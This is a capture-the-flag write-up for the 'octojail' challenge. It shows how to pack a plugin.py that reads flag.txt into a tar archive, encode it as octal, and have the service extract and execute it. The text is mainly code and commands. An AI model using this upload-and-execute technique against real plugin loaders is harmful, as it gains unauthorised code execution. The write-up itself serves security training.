# octojail

We only like octal around here!

The service reads a line of octal triplets, treats it as a tar, extracts to `uploads/`, then imports `plugin.py` and calls `run()`. So ship a tar containing `plugin.py` that prints the flag.

**Steps**

1. Create `plugin.py`:

`def run():    print(open("flag.txt").read().strip())`

2. Pack it at tar root:

`tar -cf payload.tar plugin.py`

3. Convert tar to octal triplets (each byte → 3 octal digits):

`with open("payload.tar","rb") as f:    print(''.join(f'{b:03o}' for b in f.read()))`

4. Paste that octal string to the program when it says `Send octal`. The program will extract and run your `run()` and print the flag.

**Notes**

- Don’t use paths like `../` or leading `/` in the tar (extractor blocks them).

- The loader has a 6s timeout, so keep `run()` simple and fast.
